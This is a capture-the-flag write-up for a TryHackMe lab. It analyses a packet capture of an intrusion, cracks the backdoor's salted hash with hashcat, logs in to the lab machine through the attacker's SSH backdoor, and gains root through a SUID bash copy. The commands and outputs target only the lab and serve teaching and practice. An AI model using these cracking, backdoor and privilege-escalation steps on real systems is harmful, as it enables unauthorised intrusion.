# [Overpass 2 - Hacked [easy]](https://tryhackme.com/room/overpass2hacked)

# 1) Forensics - Analyse the PCAP

After opening the pcap file on [wireshark](https://www.wireshark.org/), we can look at the HTTP stream doing: `Analyze -> Follow -> HTTP Stream`

![alt text](https://i.imgur.com/sFJRXF9.png)

Here we can see the URL of the page they used to upload a reverse shell and the payload of the attacker.

There is nothing interesting on the second tcp stream but, if we add this filter: `tcp.stream eq 3` and open the TCP Stream we can find interesting informations:

![alt text](https://i.imgur.com/0AxKyZg.png)

Here we can see the password the attacker used to privesc and the backdoor he used for persistence.

The last question is: **Using the fasttrack wordlist, how many of the system passwords were crackable?**

First we will dump `/etc/shadow` and bruteforce it using [the fasttrack wordlist](https://raw.githubusercontent.com/drtychai/wordlists/master/fasttrack.txt)

# 2)  Research - Analyse the code

Let's take a look at the [code](https://github.com/NinjaJc01/ssh-backdoor):

Looking at `main.go` we can easily get the default hash and the hardcoded salt.

Looking back at the pcap we can get the attacker hash, we can bruteforce it using hashcat by just running:

```
hashcat -m 1710 -a 0 hash:salt ~/wordlists/rockyou.txt
```

```
>>> hashcat -m 1710 -a 0 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05 ~/wordlists/rockyou.txt --show

6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:password
```

# 3)  Attack - Get back in!

When we go on the website we can see this page:

![alt text](https://i.imgur.com/LbuKaPw.png)

Let's connect to the machine using ssh:

```
>>> ssh -oHostKeyAlgorithms=+ssh-rsa -p 2222 10.10.228.190  
nk0@10.10.228.190's password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

james@overpass-production:/home/james/ssh-backdoor$ 
```
The password is the hash we cracked using rockyou.


looking at `james` home we can see a suid file, let's exploit it:
```
james@overpass-production:/home/james$ ls -a
.              .bash_logout  .gnupg     .profile                   ssh-backdoor
..             .bashrc       .local     .sudo_as_admin_successful  user.txt
.bash_history  .cache        .overpass  .suid_bash                 www
james@overpass-production:/home/james$ ./.suid_bash -p
.suid_bash-4.4# id
uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(james)
```
